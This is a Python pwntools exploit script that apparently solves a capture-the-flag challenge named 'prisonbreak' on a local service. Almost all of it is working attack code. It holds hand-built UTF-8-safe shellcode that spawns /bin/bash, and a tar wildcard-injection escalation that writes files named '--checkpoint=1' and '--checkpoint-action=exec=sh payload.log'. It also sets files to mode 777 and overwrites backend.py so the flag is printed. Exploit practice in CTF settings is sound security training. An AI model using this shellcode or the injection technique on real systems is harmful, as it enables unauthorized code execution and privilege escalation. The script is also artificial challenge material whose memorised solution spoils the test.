#!/usr/bin/python

from pwn import *
import time

xor_rax     = "\x41\x50\x58"
syscall     = "\x0f\x05"
jne_45      = "\x75\x2b"
salc        = "\xd6"
xor_rbp_14  = "\x80\x75\x0e\x58"
xor_rbp_39  = "\x80\x75\x27\x58"
xor_rbp_9   = "\x80\x75\x09\x58"
push_rsi    = "\x56"
pop_rbp     = "\x5d"

execve_utf8 = "\x56\x5f\x41\x50\x58\x50\x5e\x50\x5a\x04\x3b\x0f\x05"

#Read shellcode again to remove 0xcc bytes
payload1    =   xor_rax + jne_45
payload1    +=  "x"*(48-len(payload1))
payload1    +=  push_rsi + pop_rbp #mov rbp, rsi
payload1    +=  syscall
len1        =   len(payload1)
payload1    +=  "x"*(0x500-len1)

#execve("/bin/sh", 0, 0)
payload2    =   "/bin/bashX"
payload2    +=   "x"*(len1-len(payload2)- len(salc))
payload2    +=  salc #UTF-8
payload2    +=  xor_rbp_9
payload2    +=  execve_utf8
payload2    += "\x41\x50\x58\x04\x3c\x0f\x05"
payload2    +=  "x"*(0x500-len(payload2))

def attack(command):
    global payload1, payload2
    payload = payload1 + payload2 + command + '\n'
    config = '''
    b *0x1000002a
    '''
    context.log_level = 'debug'
    #s = process("./prisonbreak")
    #gdb.attach(s, config)
    #s.send(payload)

    #s = process(['python3', './backend.py'])
    s = remote('127.0.0.1', 1337)
    s.recvuntil('5 years in prison! Wanna escape???\n')
    s.send(payload)
    s.close()

def send_a_line(line):
    s = remote('127.0.0.1', 1337)
    s.recvuntil('5 years in prison! Wanna escape???\n')
    s.sendline(line)
    s.close()

def exploit_1():
    attack('find -exec chmod 777 log \\;')
    attack('find -exec chmod 777 backend.py \\;')
    attack('echo -n > log/--checkpoint=1')
    attack('echo -n > "log/--checkpoint-action=exec=sh payload.log"')
    send_a_line('cp /lincoln_burrows /home/prisonbreak/')

def exploit_2():
    attack('echo "print(open(\'lincoln_burrows\', \'r\').read())" > backend.py')

    raw_input('[Enter to get flag]')
    s = remote('127.0.0.1', 1337)
    s.interactive()

exploit_1()
raw_input('[End 1st step. Enter and wait a minute]')
time.sleep(60)
exploit_2()

